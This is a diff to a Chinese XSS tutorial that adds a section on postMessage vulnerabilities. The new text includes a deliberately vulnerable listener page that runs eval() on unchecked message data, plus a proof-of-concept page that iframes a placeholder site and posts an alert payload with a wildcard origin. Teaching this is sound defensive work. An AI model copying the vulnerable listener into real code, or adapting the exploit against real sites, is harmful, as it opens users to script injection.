@@ -51,12 +51,59 @@ Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“�
 
 postmessage型
 --------------------------------
-postMessage漏洞利用了 **window.postMessage** 方法的 **跨域通信** 特性，攻击者可以伪造消息，向不安全的接收端发送恶意数据，从而实现XSS攻击等。
++ postMessage漏洞利用了 **window.postMessage** 方法的 **跨域通信** 特性，攻击者可以伪造消息，向不安全的接收端发送恶意数据，从而实现XSS攻击等。
++ postMessage(message, targetOrigin): 一般只需要修改message和targetOrigin两个参数，targetOrigin为 **\*** 的时候表示不指定消息接收的origin，通配所有域。
 
 产生原理
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-+ 跨域通信：postMessage允许不同源的窗口之间安全地传递信息。
-+ 缺乏验证：如果接收方没有正确验证消息的来源或内容，攻击者可以发送伪造的消息，导致执行恶意代码或篡改应用行为。
++ 跨域通信：postMessage允许不同源的 **页面或iframe** 之间安全地传递信息，目标可以是同一个页面中的iframe，也可以是完全不同的域名和协议的窗口。
++ 缺乏验证：如果接收方没有正确验证消息的来源（ **event.origin** ）或内容格式，攻击者可以发送伪造的消息，导致执行恶意代码或篡改应用行为。
+
+示例场景
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ target站点
+	::
+
+		<html><title>dom-xss show time</title>
+		<body>
+		<h1>演示</h1>
+		<script>
+		// 接收方页面
+		window.addEventListener("message", function(event) {
+		console.log("有人约我了！他对我说:",event.data)
+			var message = event.data;
+			eval(message)
+		});
+		</script>
+		</body>
+		</html>
++ POC
+	::
+
+		使用iframe嵌套target站点（假设站点地址是：https://xxx.com）
+		
+		<!DOCTYPE html>
+		<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width">
+		<title>攻击站点</title>
+		<link href="style.css" rel="stylesheet" type="text/css" />
+		</head>
+		<h1>Exp页面</h1>
+
+		<body>
+		<iframe id="target"></iframe>
+
+		<script>
+			var target = document.getElementById("target");
+			target.addEventListener('load', () => {
+			target.contentWindow.postMessage('alert("靓仔")', '*')
+			})
+
+			target.src = "https://xxx.com"</script>
+		</body
+		</html>
+
 
 挖掘技巧
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
